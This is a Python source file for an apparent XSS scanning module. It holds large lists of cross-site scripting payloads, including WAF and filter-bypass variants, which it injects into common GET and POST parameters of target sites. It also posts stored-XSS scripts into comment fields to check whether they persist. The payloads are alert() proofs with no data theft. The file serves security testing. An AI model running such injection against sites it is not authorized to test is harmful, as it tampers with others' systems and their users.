#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Testing Module
Tests for reflected, stored, and DOM-based XSS vulnerabilities
"""

import requests
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import time
import json

class XSSTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # Basic XSS payloads
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"javascript:alert('XSS')\">",
        ]
        
        # Advanced XSS payloads for moderate/extreme levels
        self.advanced_payloads = [
            # Filter bypass techniques
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script/src=data:,alert('XSS')>",
            "<script src=data:text/javascript,alert('XSS')>",
            "<iframe/src=\"javascript:alert('XSS')\">",
            
            # Event handlers
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            
            # HTML5 vectors
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<menu id=x contextmenu=x onshow=alert('XSS')>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")'</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            
            # Protocol handlers
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<form action=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            
            # WAF bypass techniques
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",  # base64: alert('XSS');
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
            
            # Template injection attempts
            "{{alert('XSS')}}",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "<%=alert('XSS')%>",
            
            # AngularJS vectors
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "{{$on.constructor('alert(\"XSS\")')()}}",
            
            # React/JSX vectors
            "<img src=x onerror={alert('XSS')} />",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS');//'>",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1);//'>",
            "\"/><svg/onload=alert(/XSS/)>",
            "'><svg/onload=alert(/XSS/)>",
            
            # DOM XSS vectors
            "<script>location.hash.slice(1)</script>#<img src=x onerror=alert('XSS')>",
            "<script>document.write(location.hash.slice(1))</script>#<img src=x onerror=alert('XSS')>",
        ]
        
        # Context-specific payloads
        self.context_payloads = {
            'html': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            'attribute': ["\" onmouseover=\"alert('XSS')\"", "' onmouseover='alert('XSS')'"],
            'javascript': ["';alert('XSS');//", "\";alert('XSS');//"],
            'css': ["</style><script>alert('XSS')</script>", "expression(alert('XSS'))"],
            'url': ["javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>"]
        }
        
        # XSS filters and their bypasses
        self.filter_bypasses = {
            'script': ['scr<script>ipt', 'ScRiPt', '%3Cscript%3E'],
            'alert': ['al\\u0065rt', 'al\\x65rt', 'eval(atob("YWxlcnQ="))'],
            'onerror': ['on\\u0065rror', '%6Fnerror', 'on/**/error'],
            'javascript': ['java\\u0073cript', 'java%73cript', 'JaVaScRiPt']
        }
    
    def detect_xss_context(self, response_text, payload):
        """Detect the context where XSS payload is reflected"""
        contexts = []
        
        if payload in response_text:
            # Check if payload is in HTML content
            if f">{payload}<" in response_text or f" {payload} " in response_text:
                contexts.append('html')
            
            # Check if payload is in attribute
            if f'="{payload}"' in response_text or f"='{payload}'" in response_text:
                contexts.append('attribute')
            
            # Check if payload is in JavaScript
            if f"'{payload}'" in response_text or f'"{payload}"' in response_text:
                js_pattern = re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.DOTALL)
                if js_pattern:
                    contexts.append('javascript')
            
            # Check if payload is in CSS
            css_pattern = re.search(r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>', response_text, re.DOTALL)
            if css_pattern:
                contexts.append('css')
            
            # Check if payload is in URL/href
            if f'href="{payload}"' in response_text or f"href='{payload}'" in response_text:
                contexts.append('url')
        
        return contexts if contexts else ['unknown']
    
    def test_parameter_xss(self, url, param, method='GET'):
        """Test a specific parameter for XSS"""
        results = []
        
        payloads_to_test = self.basic_payloads.copy()
        if self.level in ['moderate', 'extreme']:
            payloads_to_test.extend(self.advanced_payloads)
        
        for payload in payloads_to_test:
            try:
                if method.upper() == 'GET':
                    test_params = {param: payload}
                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                else:
                    test_data = {param: payload}
                    response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                
                # Check if payload is reflected in response WITHOUT encoding
                # This is the key fix - we need to verify the payload is unencoded
                if payload in response.text:
                    # Check if it's HTML-encoded (false positive)
                    import html
                    encoded_payload = html.escape(payload)
                    
                    # If the encoded version appears but not the raw version in executable context, it's likely safe
                    if encoded_payload in response.text and payload not in response.text.replace(encoded_payload, ''):
                        # Payload is HTML-encoded - likely NOT vulnerable, skip
                        continue
                    
                    contexts = self.detect_xss_context(response.text, payload)
                    
                    # Determine confidence based on context
                    confidence = 'Low'
                    severity = 'Medium'
                    if 'html' in contexts or 'javascript' in contexts:
                        confidence = 'High'
                        severity = 'High'
                    elif 'attribute' in contexts:
                        confidence = 'Medium'
                        severity = 'High'
                    elif contexts == ['unknown']:
                        confidence = 'Low'
                        severity = 'Low'  # Downgrade if context unknown
                    
                    vuln = {
                        'type': 'Reflected XSS',
                        'severity': severity,
                        'confidence': confidence,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'contexts': contexts,
                        'evidence': f"Payload reflected unencoded in response (contexts: {', '.join(contexts)})",
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.RED}[!] XSS found: {url} (param: {param}) - Contexts: {contexts} [Confidence: {confidence}]{Style.RESET_ALL}")
                
                # Check for potential DOM XSS indicators - ONLY if payload is also reflected
                # This reduces false positives from JS libraries that naturally contain these sinks
                if payload in response.text:
                    dom_sinks = [
                        ('document.write', 'High'),
                        ('innerHTML', 'Medium'),
                        ('outerHTML', 'Medium'),
                        ('eval(', 'High'),
                    ]
                    dom_sources = [
                        'location.hash', 'location.search', 'window.name', 
                        'document.referrer', 'document.URL'
                    ]
                    
                    # Only report if we find a sink AND the payload appears near it
                    for sink, risk in dom_sinks:
                        if sink.lower() in response.text.lower():
                            # Check if payload appears within 500 chars of the sink (potential data flow)
                            sink_pos = response.text.lower().find(sink.lower())
                            payload_pos = response.text.find(payload)
                            
                            if payload_pos != -1 and abs(sink_pos - payload_pos) < 500:
                                vuln = {
                                    'type': 'Potential DOM XSS',
                                    'severity': 'Low',  # Downgraded - needs manual verification
                                    'confidence': 'Low',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'method': method,
                                    'evidence': f"DOM sink '{sink}' found near reflected payload - MANUAL VERIFICATION REQUIRED",
                                    'dom_sink': sink,
                                    'status_code': response.status_code,
                                    'note': 'This is a potential finding. DOM XSS requires manual analysis of JavaScript data flow.'
                                }
                                results.append(vuln)
                                print(f"{Fore.YELLOW}[?] Potential DOM XSS (verify manually): {url} (sink: {sink}){Style.RESET_ALL}")
                                break
                
                time.sleep(0.1)  # Small delay
                
            except Exception:
                continue
        
        return results
    
    def test_stored_xss(self, url, form_data):
        """Test for stored XSS by submitting data and checking if it persists"""
        results = []
        
        # Use a unique marker to identify our payload
        marker = f"XSS_TEST_{int(time.time())}"
        stored_payload = f"<script>alert('{marker}')</script>"
        
        try:
            # Submit the payload
            response = requests.post(url, data={**form_data, **{'comment': stored_payload, 'message': stored_payload, 'content': stored_payload}}, 
                                   timeout=self.timeout, verify=False)
            
            # Check if payload is immediately reflected (stored)
            if stored_payload in response.text or marker in response.text:
                vuln = {
                    'type': 'Stored XSS',
                    'severity': 'Critical',
                    'url': url,
                    'payload': stored_payload,
                    'method': 'POST',
                    'evidence': f"Stored XSS payload persisted with marker: {marker}",
                    'status_code': response.status_code
                }
                results.append(vuln)
                print(f"{Fore.RED}[!] Stored XSS found: {url} (marker: {marker}){Style.RESET_ALL}")
            
            # Try to retrieve the page again to see if payload persists
            time.sleep(1)
            check_response = requests.get(url, timeout=self.timeout, verify=False)
            if stored_payload in check_response.text or marker in check_response.text:
                vuln = {
                    'type': 'Confirmed Stored XSS',
                    'severity': 'Critical',
                    'url': url,
                    'payload': stored_payload,
                    'method': 'GET (verification)',
                    'evidence': f"Stored XSS confirmed - payload persists across requests",
                    'status_code': check_response.status_code
                }
                results.append(vuln)
                print(f"{Fore.RED}[!] Confirmed Stored XSS: {url}{Style.RESET_ALL}")
                
        except Exception as e:
            pass
        
        return results
    
    def test_xss(self, targets):
        """Main XSS testing function"""
        print(f"{Fore.YELLOW}[*] Starting XSS testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        for target in targets:
            url = target.get('url', target.get('subdomain', ''))
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing XSS: {url}{Style.RESET_ALL}")
            
            # Common parameters that might be vulnerable to XSS
            xss_params = ['q', 'query', 'search', 'keyword', 'term', 'name', 'username',
                         'email', 'message', 'comment', 'text', 'content', 'description',
                         'title', 'subject', 'body', 'data', 'input', 'value', 'param',
                         'callback', 'redirect', 'url', 'link', 'ref', 'return', 'page',
                         'view', 'id', 'error', 'msg', 'info', 'debug', 'lang', 'locale']
            
            # Test reflected XSS
            for param in xss_params:
                vulns = self.test_parameter_xss(url, param, 'GET')
                all_vulnerabilities.extend(vulns)
                
                # Also test POST for form parameters
                if param in ['message', 'comment', 'content', 'text', 'body']:
                    vulns = self.test_parameter_xss(url, param, 'POST')
                    all_vulnerabilities.extend(vulns)
            
            # Test stored XSS (only in moderate/extreme mode due to potential impact)
            if self.level in ['moderate', 'extreme']:
                try:
                    # Look for forms that might store data
                    response = requests.get(url, timeout=self.timeout, verify=False)
                    if any(form_indicator in response.text.lower() for form_indicator in 
                          ['<form', 'comment', 'message', 'post', 'submit', 'feedback']):
                        stored_vulns = self.test_stored_xss(url, {})
                        all_vulnerabilities.extend(stored_vulns)
                except:
                    pass
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities